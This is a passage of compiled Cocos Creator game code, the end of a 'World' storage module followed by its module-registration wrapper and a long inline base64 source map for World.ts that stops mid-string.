        /* 视频事件标记 */
        Storage._videoSign = 0;
        return Storage;
    }());
    World.Storage = Storage;
})(World = exports.World || (exports.World = {}));

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2luZm8vV29ybGQudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQSw0RUFBeUU7QUFDekUsOENBQXlDO0FBQ3pDLHlEQUFzRDtBQUN0RCxtQ0FBOEI7QUFDOUIsdUNBQWtDO0FBQ2xDLHFDQUFnQztBQUVoQyxpREFBNEM7QUFDNUMsNkVBQXVFO0FBQ3ZFLG1FQUE2RDtBQUM3RCxtRUFBNkQ7QUFDN0QsNkNBQXVDO0FBQ3ZDLCtEQUF5RDtBQUN6RCxpREFBMkM7QUFDM0MseURBQW1EO0FBRW5EOzs7Ozs7Ozs7O0VBVUU7QUFFRixJQUFjLEtBQUssQ0F5akJsQjtBQXpqQkQsV0FBYyxLQUFLO0lBQ2YsWUFBWTtJQUNDLGVBQVMsR0FBRyxHQUFHLENBQUM7SUFDN0IsYUFBYTtJQUNBLGdCQUFVLEdBQUcsR0FBRyxDQUFDO0lBQzlCLGVBQWU7SUFDRixpQkFBVyxHQUFHLEdBQUcsQ0FBQztJQUUvQixXQUFXO0lBQ0Usc0JBQWdCLEdBQUcsR0FBRyxDQUFDO0lBSXBDLE9BQU87SUFDUCxJQUFNLFVBQVUsR0FBRyxJQUFJLG9CQUFVLEVBQUUsQ0FBQztJQUNwQyxJQUFNLHdCQUF3QixHQUFHLElBQUksa0NBQXdCLEVBQUUsQ0FBQztJQUNoRSxJQUFNLG1CQUFtQixHQUFHLElBQUksNkJBQW1CLEVBQUUsQ0FBQztJQUN0RCxJQUFNLG1CQUFtQixHQUFHLElBQUksNkJBQW1CLEVBQUUsQ0FBQztJQUN0RCxJQUFNLFFBQVEsR0FBRyxJQUFJLGtCQUFRLEVBQUUsQ0FBQztJQUNoQyxJQUFNLGlCQUFpQixHQUFHLElBQUksMkJBQWlCLEVBQUUsQ0FBQztJQUNsRCxJQUFNLFVBQVUsR0FBRyxJQUFJLG9CQUFVLEVBQUUsQ0FBQztJQUNwQyxJQUFNLGNBQWMsR0FBRyxJQUFJLHdCQUFjLEVBQUUsQ0FBQztJQUU1QztRQUFBO1FBa0ZBLENBQUM7UUF0Q0csc0JBQVcsZ0JBQVU7aUJBQXJCO2dCQUNJLElB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